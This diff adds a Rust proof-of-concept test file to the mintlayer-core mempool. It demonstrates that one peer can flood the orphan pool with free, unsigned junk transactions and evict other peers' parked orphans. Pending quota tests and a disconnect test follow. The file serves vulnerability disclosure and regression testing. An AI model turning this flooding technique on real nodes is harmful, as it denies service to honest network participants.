@@ -1,0 +1,319 @@
+// Proof of concept: orphan pool starvation in the mintlayer-core mempool.
+//
+// One connected peer can displace every other peer's parked orphans, because admission to the
+// orphan pool costs nothing (no fee check, no per-peer quota), eviction is uniformly random, and
+// an evicted orphan can never be promoted when its missing parent finally arrives.
+//
+// Every submission goes through `MempoolInterface::add_transaction_remote`, the same method p2p
+// calls (`p2p/src/sync/peer/transaction_manager.rs:379`), so no test-only shortcut is involved.
+//
+// Three scenarios:
+//   1. control  - a child parked before its parent is promoted once the parent arrives.
+//   2. attack   - the same child is lost after a single peer floods the pool.
+//   3. scale    - 100 orphans from one peer are all displaced by ~1500 free submissions.
+//
+// Run:  ./run_poc.sh
+//   or: cd mintlayer-core && cargo test -p mempool --lib poc_orphan -- --nocapture --test-threads=1
+
+use super::*;
+
+use crate::interface::MempoolInterface;
+use common::chain::signature::inputsig::InputWitness;
+use mempool_types::tx_origin::RemoteTxOrigin;
+use p2p_types::PeerId;
+
+type Pool = crate::pool::Mempool<crate::pool::memory_usage_estimator::StoreMemoryUsageEstimator>;
+
+const HONEST_PEER: u64 = 2;
+const HOSTILE_PEER: u64 = 3;
+
+/// Submit a transaction exactly as a remote peer would.
+fn submit(mempool: &mut Pool, tx: SignedTransaction, peer_id: u64) -> Result<TxStatus, crate::error::Error> {
+    let origin = RemoteTxOrigin::new(PeerId::from_u64(peer_id));
+    let options = TxOptions::default_for(origin.into());
+    mempool.add_transaction_remote(tx, origin, options)
+}
+
+/// A minimal transaction whose input spends an outpoint that exists nowhere.
+/// It satisfies `check_transaction` (structure, witness count, size) and fails later at the utxo
+/// lookup, which classifies it as an orphan. No fee is ever computed and no signature is ever
+/// verified, because the fee policy only runs for transactions that already validated.
+fn free_orphan_tx(rng: &mut impl CryptoRng, counter: u32, tag: u8) -> SignedTransaction {
+    let mut input_bytes = [0u8; 32];
+    input_bytes[0] = (counter & 0xff) as u8;
+    input_bytes[1] = ((counter >> 8) & 0xff) as u8;
+    input_bytes[2] = tag;
+
+    let source: Id<Transaction> = H256(input_bytes).into();
+    let tx = Transaction::new(
+        0,
+        vec![TxInput::from_utxo(source.into(), 0)],
+        vec![TxOutput::Transfer(
+            OutputValue::Coin(Amount::from_atoms(1_000)),
+            Destination::AnyoneCanSpend,
+        )],
+    )
+    .unwrap();
+    SignedTransaction::new(tx, vec![InputWitness::NoSignature(None)]).unwrap()
+}
+
+/// One block with one funding tx that provides two spendable outputs.
+fn setup() -> (Pool, Id<Transaction>, BlockHeight) {
+    let mut rng = make_seedable_rng(Seed::from_u64(1));
+    let mut tf = TestFramework::builder(&mut rng).build();
+    let genesis_id = tf.genesis().get_id();
+
+    let funding = TransactionBuilder::new()
+        .add_input(
+            TxInput::from_utxo(OutPointSourceId::BlockReward(genesis_id.into()), 0),
+            empty_witness(&mut rng),
+        )
+        .add_output(TxOutput::Transfer(
+            OutputValue::Coin(Amount::from_atoms(1_000_000)),
+            Destination::AnyoneCanSpend,
+        ))
+        .add_output(TxOutput::Transfer(
+            OutputValue::Coin(Amount::from_atoms(1_000_000)),
+            Destination::AnyoneCanSpend,
+        ))
+        .build();
+    let funding_id = funding.transaction().get_id();
+    tf.make_block_builder().add_transaction(funding).build_and_process(&mut rng).unwrap();
+
+    let height = tf.best_block_index().block_height();
+    let mempool =
+        setup_with_chainstate_generic(tf.chainstate(), create_mempool_config(), Default::default());
+
+    (mempool, funding_id, height)
+}
+
+fn parent_and_child(
+    rng: &mut impl CryptoRng,
+    funding_id: Id<Transaction>,
+    out_idx: u32,
+) -> (SignedTransaction, SignedTransaction) {
+    let parent = TransactionBuilder::new()
+        .add_input(
+            TxInput::from_utxo(OutPointSourceId::Transaction(funding_id), out_idx),
+            empty_witness(rng),
+        )
+        .add_anyone_can_spend_output(900_000)
+        .build();
+    let parent_id = parent.transaction().get_id();
+    let child = TransactionBuilder::new()
+        .add_input(TxInput::from_utxo(parent_id.into(), 0), empty_witness(rng))
+        .add_anyone_can_spend_output(800_000)
+        .build();
+    (parent, child)
+}
+
+// ------------------------------------------------------------------ 1. control
+
+/// Baseline: park the child, then deliver the parent. The child is promoted into the mempool.
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+async fn poc_orphan_control_child_is_promoted() {
+    let mut rng = make_seedable_rng(Seed::from_u64(1));
+    let (mut mempool, funding_id, height) = setup();
+    println!("CONTROL: tip height = {height:?}");
+
+    let (parent, child) = parent_and_child(&mut rng, funding_id, 0);
+    let parent_id = parent.transaction().get_id();
+    let child_id = child.transaction().get_id();
+
+    submit(&mut mempool, child, HONEST_PEER).expect("child should be parked").assert_in_orphan_pool();
+    println!(
+        "CONTROL: child parked in orphan pool = {}",
+        mempool.contains_orphan_transaction(&child_id)
+    );
+
+    submit(&mut mempool, parent, HONEST_PEER).expect("parent should be accepted").assert_in_mempool();
+    for _ in 0..5 {
+        mempool.perform_work_unit();
+    }
+
+    let promoted = mempool.contains_transaction(&child_id);
+    println!(
+        "CONTROL: parent {parent_id} accepted into mempool = {}",
+        mempool.contains_transaction(&parent_id)
+    );
+    println!("CONTROL: child promoted into mempool = {promoted}");
+    assert!(promoted, "baseline broken: the child was not promoted");
+}
+
+// ------------------------------------------------------------------ 2. attack
+
+/// Same setup, but the hostile peer floods the pool between the child and its parent.
+/// The child is evicted, and when the parent arrives there is nothing left to promote.
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+async fn poc_orphan_attack_child_is_lost() {
+    let mut rng = make_seedable_rng(Seed::from_u64(2));
+    let (mut mempool, funding_id, height) = setup();
+    println!("ATTACK: tip height = {height:?}");
+
+    let (parent, child) = parent_and_child(&mut rng, funding_id, 1);
+    let child_id = child.transaction().get_id();
+
+    submit(&mut mempool, child, HONEST_PEER).expect("child should be parked").assert_in_orphan_pool();
+    println!(
+        "ATTACK: child parked in orphan pool = {}",
+        mempool.contains_orphan_transaction(&child_id)
+    );
+
+    let mut accepted = 0u32;
+    let mut rejected = 0u32;
+    for i in 0..1500u32 {
+        match submit(&mut mempool, free_orphan_tx(&mut rng, i, 0xb2), HOSTILE_PEER) {
+            Ok(_) => accepted += 1,
+            Err(_) => rejected += 1,
+        }
+    }
+    println!("ATTACK: hostile submissions accepted = {accepted}, rejected = {rejected}");
+    println!(
+        "ATTACK: child survives the flood = {}",
+        mempool.contains_orphan_transaction(&child_id)
+    );
+
+    submit(&mut mempool, parent, HONEST_PEER).expect("parent should be accepted").assert_in_mempool();
+    for _ in 0..5 {
+        mempool.perform_work_unit();
+    }
+
+    let promoted = mempool.contains_transaction(&child_id);
+    println!("ATTACK: child promoted into mempool = {promoted}");
+    assert!(!promoted, "the child was expected to be gone");
+    assert!(!mempool.contains_orphan_transaction(&child_id));
+}
+
+// ------------------------------------------------------------------ 3. scale
+
+/// How much of another peer's parked state survives a flood of free submissions.
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+async fn poc_orphan_scale_all_displaced() {
+    let mut rng = make_seedable_rng(Seed::from_u64(3));
+    let (mut mempool, _funding_id, _height) = setup();
+
+    let mut honest_ids = Vec::new();
+    for i in 0..100u32 {
+        let tx = free_orphan_tx(&mut rng, i, 0xa1);
+        honest_ids.push(tx.transaction().get_id());
+        submit(&mut mempool, tx, HONEST_PEER).expect("orphan should be parked");
+    }
+    let before = honest_ids.iter().filter(|id| mempool.contains_orphan_transaction(id)).count();
+    println!("SCALE: honest orphans parked = {before}");
+
+    let sample = make_test_tx_entry(&TimeGetter::default(), free_orphan_tx(&mut rng, 9_999, 0xb2));
+    println!("SCALE: cost of one hostile tx = {} bytes", sample.size());
+
+    let mut accepted = 0u32;
+    for i in 0..1500u32 {
+        if submit(&mut mempool, free_orphan_tx(&mut rng, i, 0xb2), HOSTILE_PEER).is_ok() {
+            accepted += 1;
+        }
+    }
+
+    let after = honest_ids.iter().filter(|id| mempool.contains_orphan_transaction(id)).count();
+    println!(
+        "SCALE: hostile submissions accepted = {accepted} (~{} KiB of traffic)",
+        (accepted * 50) / 1024
+    );
+    println!("SCALE: honest orphans still parked = {after} / {before}");
+    assert_eq!(after, 0, "expected every parked orphan to be displaced");
+}
+
+// ------------------------------------------------------------------ 4. quota (red until fixed)
+
+/// One hostile connection must not be able to evict another peer's parked orphans.
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+#[ignore = "per-peer orphan quota not implemented yet"]
+async fn quota_two_peer_fairness_hostile_flood_cannot_evict() {
+    let mut rng = make_seedable_rng(Seed::from_u64(4));
+    let (mut mempool, funding_id, _height) = setup();
+
+    let (parent, child) = parent_and_child(&mut rng, funding_id, 0);
+    let child_id = child.transaction().get_id();
+    submit(&mut mempool, child, HONEST_PEER).expect("child should be parked").assert_in_orphan_pool();
+
+    for i in 0..1500u32 {
+        let _ = submit(&mut mempool, free_orphan_tx(&mut rng, i, 0xb2), HOSTILE_PEER);
+    }
+
+    assert!(
+        mempool.contains_orphan_transaction(&child_id),
+        "a hostile peer must not evict another peer's parked orphan"
+    );
+
+    // A surviving parked child must still be promotable once its parent arrives.
+    submit(&mut mempool, parent, HONEST_PEER).expect("parent should be accepted").assert_in_mempool();
+    for _ in 0..5 {
+        mempool.perform_work_unit();
+    }
+    assert!(
+        mempool.contains_transaction(&child_id),
+        "a surviving orphan must be promoted when its parent arrives"
+    );
+}
+
+/// Eviction must not degenerate into coin flips when many peers hold one entry each.
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+#[ignore = "per-peer orphan quota not implemented yet"]
+async fn quota_many_small_peers_cannot_evict_honest_entry() {
+    let mut rng = make_seedable_rng(Seed::from_u64(5));
+    let (mut mempool, funding_id, _height) = setup();
+
+    let (_, child) = parent_and_child(&mut rng, funding_id, 1);
+    let child_id = child.transaction().get_id();
+    submit(&mut mempool, child, HONEST_PEER).expect("child should be parked").assert_in_orphan_pool();
+
+    // 99 distinct peers each contribute one junk orphan, then keep resubmitting.
+    for i in 0..800u32 {
+        let peer = 10 + (i % 99) as u64;
+        let _ = submit(&mut mempool, free_orphan_tx(&mut rng, i, 0xb3), peer);
+    }
+
+    assert!(
+        mempool.contains_orphan_transaction(&child_id),
+        "many single-entry peers must not displace an honest peer's orphan"
+    );
+}
+
+/// A busy honest peer (no attacker) must not crowd out a slow peer's parked orphan.
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+#[ignore = "per-peer orphan quota not implemented yet"]
+async fn quota_fair_share_under_legitimate_load() {
+    let mut rng = make_seedable_rng(Seed::from_u64(7));
+    let (mut mempool, funding_id, _height) = setup();
+
+    let (_, child) = parent_and_child(&mut rng, funding_id, 1);
+    let child_id = child.transaction().get_id();
+    submit(&mut mempool, child, HONEST_PEER).expect("child should be parked").assert_in_orphan_pool();
+
+    // A busy-but-honest peer streams ordinary orphans; nothing hostile.
+    for i in 0..500u32 {
+        let _ = submit(&mut mempool, free_orphan_tx(&mut rng, i, 0xa2), 4);
+    }
+
+    assert!(
+        mempool.contains_orphan_transaction(&child_id),
+        "honest traffic must not evict another peer's parked orphan"
+    );
+}
+
+// ------------------------------------------------------------------ 5. disconnect teardown
+
+/// Orphans parked by a peer must leave with the peer's connection.
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+async fn teardown_removes_peer_orphans_on_disconnect() {
+    let mut rng = make_seedable_rng(Seed::from_u64(6));
+    let (mut mempool, funding_id, _height) = setup();
+
+    let (_, child) = parent_and_child(&mut rng, funding_id, 0);
+    let child_id = child.transaction().get_id();
+    submit(&mut mempool, child, HONEST_PEER).expect("child should be parked").assert_in_orphan_pool();
+
+    mempool.on_peer_disconnected(PeerId::from_u64(HONEST_PEER));
+
+    assert!(
+        !mempool.contains_orphan_transaction(&child_id),
+        "a peer's orphans must be purged when it disconnects"
+    );
+}
